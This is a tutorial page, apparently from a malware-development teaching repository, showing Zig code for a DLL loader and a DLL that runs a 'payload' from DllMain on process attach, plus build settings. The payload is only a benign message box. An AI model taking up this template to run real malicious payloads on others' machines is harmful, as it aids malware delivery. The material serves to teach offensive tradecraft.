# Execute Via DLL

## TL;DR

[See the code example](https://github.com/CX330Blake/Black-Hat-Zig/tree/main/src/Payload-Execution/dll)

## Code Walkthrough

DLL loader

```zig title="main.zig"
const std = @import("std");
const windows = std.os.windows;
const print = std.debug.print;

// Windows API functions
extern "kernel32" fn GetModuleFileNameA(hModule: ?windows.HMODULE, lpFilename: [*]u8, nSize: windows.DWORD) callconv(.C) windows.DWORD;

pub fn main() !void {
    var gpa = std.heap.GeneralPurposeAllocator(.{}){};
    defer _ = gpa.deinit();
    const allocator = gpa.allocator();

    // Get command line arguments
    const args = try std.process.argsAlloc(allocator);
    defer std.process.argsFree(allocator, args);

    if (args.len < 2) {
        print("[!] Missing Argument; Dll Payload To Run \n", .{});
        print("Usage: {s} <dll_path>\n", .{args[0]});
        std.process.exit(1);
    }

    const dll_path = args[1];
    const current_pid = windows.GetCurrentProcessId();

    print("[i] Injecting \"{s}\" To The Local Process Of Pid: {d} \n", .{ dll_path, current_pid });

    // Check if DLL file exists and get full path
    var full_path_buf: [windows.PATH_MAX_WIDE]u8 = undefined;
    const full_path = std.fs.cwd().realpath(dll_path, &full_path_buf) catch |err| {
        print("[!] Cannot access DLL file \"{s}\": {}\n", .{ dll_path, err });
        print("[!] Make sure the file exists and is in the current directory\n", .{});
        std.process.exit(1);
    };

    print("[+] Full DLL path: {s}\n", .{full_path});
    print("[+] Loading Dll... ", .{});

    var open_lib = std.DynLib.open(dll_path);
    if (open_lib) |*lib| {
        const handle = lib.inner.dll;
        print("SUCCESS!\n", .{});
        print("[+] DLL Handle: 0x{x}\n", .{@intFromPtr(handle)});

        // Verify the loaded module
        var module_name: [windows.MAX_PATH]u8 = undefined;
        const name_len = GetModuleFileNameA(handle, &module_name, windows.MAX_PATH);
        if (name_len > 0) {
            print("[+] Loaded module: {s}\n", .{module_name[0..name_len]});
        }

        print("[+] DLL loaded successfully! Waiting for payload execution...\n", .{});

        // Give the DLL time to execute
        std.time.sleep(2 * std.time.ns_per_s); // Wait 2 seconds

        // Keep the DLL loaded for a bit longer
        print("[+] Press <Enter> to unload DLL and exit... ", .{});
        _ = std.io.getStdIn().reader().readByte() catch {};

        // Unload the DLL
        lib.close();
        print("[+] DLL unloaded successfully\n", .{});

        print("[+] DONE!\n", .{});
    } else |_| {
        const error_code = windows.GetLastError();
        print("FAILED!\n", .{});
        print("[!] LoadLibraryA Failed With Error: {d}\n", .{@intFromEnum(error_code)});

        // Print common error meanings
        switch (error_code) {
            .FILE_NOT_FOUND => print("    → The system cannot find the file specified\n", .{}),
            .PATH_NOT_FOUND => print("    → The system cannot find the path specified\n", .{}),
            .MOD_NOT_FOUND => print("    → The specified module could not be found\n", .{}),
            .BAD_EXE_FORMAT => print("    → Not a valid Win32 application\n", .{}),
            else => print("    → Unknown error\n", .{}),
        }
        std.process.exit(1);
    }
}
```

The DLL itself.

```zig title="root.zig"
const std = @import("std");
const windows = std.os.windows;

// Windows API types
const HINSTANCE = windows.HINSTANCE;
const DWORD = windows.DWORD;
const LPVOID = *anyopaque;
const BOOL = windows.BOOL;

// DLL reasons
const DLL_PROCESS_ATTACH: DWORD = 1;
const DLL_THREAD_ATTACH: DWORD = 2;
const DLL_THREAD_DETACH: DWORD = 3;
const DLL_PROCESS_DETACH: DWORD = 0;

// MessageBox constants
const MB_OK: u32 = 0x00000000;
const MB_ICONINFORMATION: u32 = 0x00000040;

// Windows API functions
extern "user32" fn MessageBoxA(
    hWnd: ?windows.HWND,
    lpText: [*:0]const u8,
    lpCaption: [*:0]const u8,
    uType: u32,
) callconv(.C) i32;

fn msgBoxPayload() void {
    _ = MessageBoxA(
        null,
        "Please give Black-Hat-Zig a star!",
        "Malware!",
        MB_OK | MB_ICONINFORMATION,
    );
}

// DllMain has to be public
pub export fn DllMain(hModule: HINSTANCE, dwReason: DWORD, lpReserved: LPVOID) callconv(.C) BOOL {
    _ = hModule;
    _ = lpReserved;

    switch (dwReason) {
        DLL_PROCESS_ATTACH => {
            msgBoxPayload();
        },
        DLL_THREAD_ATTACH, DLL_THREAD_DETACH, DLL_PROCESS_DETACH => {
            // Do nothing for these cases
        },
        else => {
            // Handle unexpected values
        },
    }

    return 1; // TRUE
}
```

You should add this to your `build.zig`. You can replace the `payload_dll` to the name you like.

```zig title="build.zig"
const payload_dll = b.addSharedLibrary(.{
    .name = "payload_dll",
    .root_source_file = b.path("src/root.zig"),
    .target = target,
    .optimize = optimize,
});

// Link Windows libraries for the DLL
payload_dll.linkSystemLibrary("kernel32");
payload_dll.linkSystemLibrary("user32");
```
